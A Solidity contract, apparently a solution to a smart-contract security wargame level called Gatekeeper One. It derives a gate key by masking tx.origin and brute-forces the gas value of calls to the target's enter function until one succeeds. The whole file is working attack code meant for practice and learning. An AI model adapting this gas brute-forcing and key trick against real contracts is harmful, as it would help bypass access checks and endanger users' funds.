// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IGatekeeperOne} from "../interfaces/IGatekeeperOne.sol";

contract GatekeeperOneAttack {
    IGatekeeperOne public target;
    uint256 public winningGasOffset;

    constructor(address _targetAddress) {
        target = IGatekeeperOne(_targetAddress);
    }

    function attack() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", gateKey);

        for (uint256 i = 0; i < 8191; i++) {
            (bool success,) = address(target).call{gas: (8191 * 3) + i}(payload);
            if (success) {
                winningGasOffset = i;
                return;
            }
        }
        revert("GatekeeperOneAttack: failed to pass gates");
    }
}
